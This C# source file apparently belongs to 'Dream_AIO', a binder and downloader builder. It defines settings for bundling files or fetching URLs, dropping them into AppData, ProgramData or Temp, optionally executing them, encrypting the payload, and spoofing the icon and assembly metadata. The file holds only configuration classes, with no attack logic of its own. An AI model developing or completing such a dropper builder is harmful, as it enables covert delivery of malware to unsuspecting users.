using System;
using System.Collections.Generic;
using System.Text;

namespace Dream_AIO
{
    public class SettingsFile
    {
        public List<BinderSetting> BindFiles;
        public List<DownloaderSetting> DownloadFiles;

        public bool EncryptFiles;
        public bool CompressFiles;

        public string IconPath;

        public string AssemblyDescription;
        public string AssemblyProductName;
        public string AssemblyCompany;
        public string AssemblyCopyright;
        public string AssemblyVersion;
    }

    public class BinderSetting
    {
        public string FileName;
        public DropOptions Options;

        public Dictionary<string,string> Dictionarize()
        {
            Dictionary<string, string> d = new Dictionary<string, string>();
            d.Add("k", "b");
            foreach(var x in Options.Dictionarize())
            {
                d.Add(x.Key, x.Value);
            }
            return d;
        }
    }

    public class DownloaderSetting
    {
        public string Url;
        public DropOptions Options;

        public Dictionary<string, string> Dictionarize()
        {
            Dictionary<string, string> d = new Dictionary<string, string>();
            d.Add("u", Url);
            d.Add("k", "d");
            foreach (var x in Options.Dictionarize())
            {
                d.Add(x.Key, x.Value);
            }
            return d;
        }
    }

    public class DropOptions
    {
        public string DropFolder;
        public string DirectoryName;
        public string FileName;
        public bool Execute;

        public Dictionary<string, string> Dictionarize()
        {
            Dictionary<string, string> d = new Dictionary<string, string>();

            d.Add("df", ChangeNames(DropFolder));
            d.Add("sf", DirectoryName);
            d.Add("fn", FileName);
            d.Add("e", Execute ? "y" : "n");

            return d;
        }

        private string ChangeNames(string name)
        {
            switch (name.ToLowerInvariant())
            {
                case "appdata": return "ad";
                case "programdata":return "pd";
                case "current directory":return "cd";
                case "temp":return "t";
            }
            return name;
        }
    }
}
